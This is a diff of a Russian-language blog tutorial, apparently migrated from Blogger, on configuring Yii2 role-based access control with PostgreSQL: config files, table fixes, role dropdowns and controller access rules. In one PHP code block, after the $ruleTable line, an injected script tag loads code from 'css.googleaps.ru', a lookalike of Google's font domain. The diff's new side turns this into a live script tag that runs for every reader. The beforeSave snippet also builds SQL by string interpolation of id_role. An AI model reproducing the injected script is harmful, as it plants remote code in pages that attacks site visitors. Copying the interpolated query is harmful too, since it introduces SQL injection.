@@ -29,8 +29,8 @@ tags:
 - orm
 comments: []
 ---
-<div dir="ltr" style="text-align: left;"><a href="http:&#47;&#47;developer.uz&#47;blog&#47;rbac-%D1%80%D0%BE%D0%BB%D0%B8-%D0%B8-%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D0%B5%D0%BB%D0%B8-%D0%B2-yii2&#47;" target="_blank">на основании <&#47;a>yii2rbaccommonconfigmain.php</p>
-<pre><code> dirname(dirname(__DIR__)) . '&#47;vendor',<br />
+<div dir="ltr" style="text-align: left;"><a href="http://developer.uz/blog/rbac-%D1%80%D0%BE%D0%BB%D0%B8-%D0%B8-%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D0%B5%D0%BB%D0%B8-%D0%B2-yii2/" target="_blank">на основании </a>yii2rbaccommonconfigmain.php</p>
+<pre><code> dirname(dirname(__DIR__)) . '/vendor',<br />
     'components' => [<br />
         'urlManager' => [<br />
             'class' => 'yiiweburlManager',<br />
@@ -42,7 +42,7 @@ comments: []
         'authManager' => [<br />
             'class' => 'yiirbacDbManager',<br />
         ],<br />
-    ],<&#47;code><&#47;pre><br />
+    ],</code></pre><br />
 так использую постгрес. миграции не сработают. берем sql файл из<br />
 localhostyii2rbacvendoryiisoftyii2rbacmigrations</p>
 <p>восстановление пошло не по плану. что ж создадим таблички сами</p>
@@ -98,43 +98,43 @@ WITH (oids = false);</p>
     NOT DEFERRABLE<br />
 )<br />
 WITH (oids = false);<br />
-<&#47;code><&#47;pre><br />
+</code></pre><br />
 подключаем модуль</p>
-<p>composer require developeruz&#47;yii2-db-rbac "dev-master"</p>
-<p>можеи перейти на http:&#47;&#47;localhost&#47;yii2rbac&#47;backend&#47;web&#47;index.php&#47;&#47;permit&#47;access&#47;role</p>
+<p>composer require developeruz/yii2-db-rbac "dev-master"</p>
+<p>можеи перейти на http://localhost/yii2rbac/backend/web/index.php//permit/access/role</p>
 <p>для управления ролями.</p>
 <p>у меня вышел косяк - не увидел таблицы в схеме пришлось править в<br />
 yii2rbacvendoryiisoftyii2rbacDbManager.php путь к базе</p>
 <pre><code>    public $db = 'db';<br />
-    &#47;**<br />
+    /**<br />
      * @var string the name of the table storing authorization items. Defaults to "auth_item".<br />
-     *&#47;<br />
+     */<br />
     public $itemTable = 'yii2.{{%auth_item}}';<br />
-    &#47;**<br />
+    /**<br />
      * @var string the name of the table storing authorization item hierarchy. Defaults to "auth_item_child".<br />
-     *&#47;<br />
+     */<br />
     public $itemChildTable = 'yii2.{{%auth_item_child}}';<br />
-    &#47;**<br />
+    /**<br />
      * @var string the name of the table storing authorization item assignments. Defaults to "auth_assignment".<br />
-     *&#47;<br />
+     */<br />
     public $assignmentTable = 'yii2.{{%auth_assignment}}';<br />
-    &#47;**<br />
+    /**<br />
      * @var string the name of the table storing rules. Defaults to "auth_rule".<br />
-     *&#47;<br />
-    public $ruleTable = 'yii2.{{%auth_rule}}';<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre><br />
+     */<br />
+    public $ruleTable = 'yii2.{{%auth_rule}}';<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></code></pre><br />
 при создании роли получил ошибку что не может юникс время записать в таймстамп</p>
 <p>поправил yii2rbacvendoryiisoftyii2rbacDbManager.php</p>
 <pre><code>    protected function addItem($item)<br />
     {<br />
-        &#47;&#47;$time = time();<br />
-        $time = date("Y-m-d H:i:s"); <&#47;code><&#47;pre><br />
+        //$time = time();<br />
+        $time = date("Y-m-d H:i:s"); </code></pre><br />
 для выпадающего списка ролей нужно создать модель</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;3.bp.blogspot.com&#47;-9f1C6KPDV0Y&#47;VZDW7Lo2OAI&#47;AAAAAAAAAis&#47;UbZ96VgTRyc&#47;s1600&#47;Screenshot_11.png"><img src="http:&#47;&#47;3.bp.blogspot.com&#47;-9f1C6KPDV0Y&#47;VZDW7Lo2OAI&#47;AAAAAAAAAis&#47;UbZ96VgTRyc&#47;s320&#47;Screenshot_11.png" alt="" width="276" height="320" border="0" &#47;><&#47;a><&#47;div></p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;1.bp.blogspot.com&#47;-2WN1WCC8EKA&#47;VZDV6nfqGMI&#47;AAAAAAAAAik&#47;F8LTiqn4ltY&#47;s1600&#47;Screenshot_10.png">&nbsp;<&#47;a><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://3.bp.blogspot.com/-9f1C6KPDV0Y/VZDW7Lo2OAI/AAAAAAAAAis/UbZ96VgTRyc/s1600/Screenshot_11.png"><img src="http://3.bp.blogspot.com/-9f1C6KPDV0Y/VZDW7Lo2OAI/AAAAAAAAAis/UbZ96VgTRyc/s320/Screenshot_11.png" alt="" width="276" height="320" border="0" /></a></div></p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://1.bp.blogspot.com/-2WN1WCC8EKA/VZDV6nfqGMI/AAAAAAAAAik/F8LTiqn4ltY/s1600/Screenshot_10.png">&nbsp;</a></div><br />
 при создании базы удивило отсутствие айдишников. сейчас при создании списка это аукнулось. в auth_item создаю поле id, делаю его serial</p>
 <p>На самом деле pg нормально отрабатывает если прописать так yii2rbaccommonconfigdb.php</p>
 <pre><code> 'yiidbConnection',<br />
-    &#47;&#47;'dsn' => 'mysql:host=localhost;dbname=localdb',<br />
+    //'dsn' => 'mysql:host=localhost;dbname=localdb',<br />
     'dsn' => 'pgsql:host=*.ru;port=5432;dbname=DB_*',<br />
     'username' => '*',<br />
     'password' => '*',<br />
@@ -142,7 +142,7 @@ yii2rbacvendoryiisoftyii2rbacDbManager.php путь к базе</p>
     'schemaMap' => [<br />
         'pgsql' => [<br />
             'class' => 'yiidbpgsqlSchema',<br />
-            'defaultSchema' => 'yii2', &#47;&#47;specify your schema here<br />
+            'defaultSchema' => 'yii2', //specify your schema here<br />
         ]<br />
     ],<br />
     'on afterOpen' => function ($event)<br />
@@ -150,25 +150,25 @@ yii2rbacvendoryiisoftyii2rbacDbManager.php путь к базе</p>
         $event->sender->createCommand("SET search_path TO yii2")->execute();<br />
     }<br />
 ];</p>
-<p><&#47;code><&#47;pre><br />
+<p></code></pre><br />
 пришлось снова поправить модель localhostyii2rbacbackendmodelsRole.php</p>
 <pre><code>    public static function tableName()<br />
     {<br />
         return Yii::$app->params['pgschema'] . '.auth_item';<br />
-    }<&#47;code><&#47;pre><br />
+    }</code></pre><br />
 yii2rbacbackendviewsuser_form.php</p>
 <pre><code>use yiihelpersArrayHelper;<br />
-use backendmodelsRole;<&#47;code><&#47;pre></p>
-<pre><code>&nbsp;<&#47;code><&#47;pre></p>
+use backendmodelsRole;</code></pre></p>
+<pre><code>&nbsp;</code></pre></p>
 <pre><code>Html::activeDropDownList(<br />
         $model,<br />
         'id_role',<br />
         ArrayHelper::map(<br />
             Role::find()->all(), 'id', 'name'<br />
         )<br />
-    )<&#47;code><&#47;pre><br />
+    )</code></pre><br />
 получил</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;3.bp.blogspot.com&#47;-6XoRwa-jaZ4&#47;VZDYPqi_H4I&#47;AAAAAAAAAi4&#47;48xoM9-H1HM&#47;s1600&#47;Screenshot_12.png"><img src="http:&#47;&#47;3.bp.blogspot.com&#47;-6XoRwa-jaZ4&#47;VZDYPqi_H4I&#47;AAAAAAAAAi4&#47;48xoM9-H1HM&#47;s320&#47;Screenshot_12.png" alt="" width="320" height="291" border="0" &#47;><&#47;a><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://3.bp.blogspot.com/-6XoRwa-jaZ4/VZDYPqi_H4I/AAAAAAAAAi4/48xoM9-H1HM/s1600/Screenshot_12.png"><img src="http://3.bp.blogspot.com/-6XoRwa-jaZ4/VZDYPqi_H4I/AAAAAAAAAi4/48xoM9-H1HM/s320/Screenshot_12.png" alt="" width="320" height="291" border="0" /></a></div><br />
 поправим localhostyii2rbacbackendmodelsMyUser.php</p>
 <pre><code>    public function beforeSave($insert)<br />
     {<br />
@@ -180,14 +180,14 @@ use backendmodelsRole;<&#47;code><&#47;pre></p>
                 $this->password_hash = Yii::$app->security->generatePasswordHash($this->password_hash);<br />
             }<br />
         }<br />
-           &#47;&#47; $userId = Yii::$app->user->identity->id;<br />
+           // $userId = Yii::$app->user->identity->id;<br />
             $userId = $this->id;<br />
             $command = static::getDb()->createCommand("SELECT name FROM yii2."auth_item" where id =$this->id_role")->queryScalar();<br />
             $userRole = Yii::$app->authManager->getRole($command);<br />
             Yii::$app->authManager->revokeAll($userId);<br />
             Yii::$app->authManager->assign($userRole, $this->id);</p>
 <p>        return parent::beforeSave($insert);<br />
-    }<&#47;code><&#47;pre><br />
+    }</code></pre><br />
 проверяем yii2rbacfrontendcontrollersSiteController.php</p>
 <pre><code>    public function behaviors()<br />
     {<br />
@@ -205,7 +205,7 @@ use backendmodelsRole;<&#47;code><&#47;pre></p>
                         'actions' => ['logout'],<br />
                         'allow' => true,<br />
                         'roles' => ['@'],<br />
-                      &#47;&#47;  'roles' => ['admin'],<br />
+                      //  'roles' => ['admin'],<br />
                     ],<br />
                          [<br />
                     'actions' => ['about'],<br />
@@ -221,9 +221,9 @@ use backendmodelsRole;<&#47;code><&#47;pre></p>
                 ],<br />
             ],</p>
 <p>        ];<br />
-    }<&#47;code><&#47;pre><br />
-если не админ то по &#47;yii2rbac&#47;frontend&#47;web&#47;index.php&#47;site&#47;about</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;4.bp.blogspot.com&#47;-RTI9KRUzzto&#47;VZDz9NYXfxI&#47;AAAAAAAAAjI&#47;_MzPZE656UM&#47;s1600&#47;Screenshot_13.png"><img src="http:&#47;&#47;4.bp.blogspot.com&#47;-RTI9KRUzzto&#47;VZDz9NYXfxI&#47;AAAAAAAAAjI&#47;_MzPZE656UM&#47;s320&#47;Screenshot_13.png" alt="" width="320" height="180" border="0" &#47;><&#47;a><&#47;div><br />
+    }</code></pre><br />
+если не админ то по /yii2rbac/frontend/web/index.php/site/about</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://4.bp.blogspot.com/-RTI9KRUzzto/VZDz9NYXfxI/AAAAAAAAAjI/_MzPZE656UM/s1600/Screenshot_13.png"><img src="http://4.bp.blogspot.com/-RTI9KRUzzto/VZDz9NYXfxI/AAAAAAAAAjI/_MzPZE656UM/s320/Screenshot_13.png" alt="" width="320" height="180" border="0" /></a></div><br />
 yii2rbacbackendcontrollersUserController.php<br />
 добавим проверку прав в контролере пользователей</p>
 <pre><code><br />
@@ -249,7 +249,7 @@ use yiifiltersAccessControl;</p>
                 ],<br />
             ],<br />
         ];<br />
-    }<&#47;code><&#47;pre><br />
+    }</code></pre><br />
 но думаю можно и просто убрать кнопки в yii2rbacbackendviewsuserindex.php</p>
 <pre><code>    user->identity->id;<br />
     $roles = array_keys(Yii::$app->authManager->getRolesByUser($userId));<br />
@@ -257,14 +257,14 @@ use yiifiltersAccessControl;</p>
     {<br />
     $buttons =   ['class' => 'yiigridActionColumn',<br />
                 'template' => '{view} {update} {delete}',<br />
-               &#47;&#47; 'view'=><br />
+               // 'view'=><br />
                 ];<br />
     }<br />
     else<br />
     {<br />
         $buttons =   ['class' => 'yiigridActionColumn',<br />
                 'template' => '{view}',<br />
-               &#47;&#47; 'view'=><br />
+               // 'view'=><br />
                 ];<br />
     }<br />
     echo GridView::widget([<br />
@@ -274,15 +274,15 @@ use yiifiltersAccessControl;</p>
             ['class' => 'yiigridSerialColumn'],</p>
 <p>            'id',<br />
             'username',<br />
-            &#47;&#47;'password_hash',<br />
+            //'password_hash',<br />
             'id_role',<br />
             'comment:ntext',<br />
-            &#47;&#47; 'created_at',<br />
-            &#47;&#47; 'ban_date',<br />
-            &#47;&#47; 'status',<br />
-            &#47;&#47; 'auth_key:ntext',</p>
+            // 'created_at',<br />
+            // 'ban_date',<br />
+            // 'status',<br />
+            // 'auth_key:ntext',</p>
 <p>            $buttons</p>
 <p>        ],<br />
-    ]); ?><&#47;code><&#47;pre><br />
-<&#47;div><br />
+    ]); ?></code></pre><br />
+</div><br />
 Source: des1roer.blogspot.com</p>
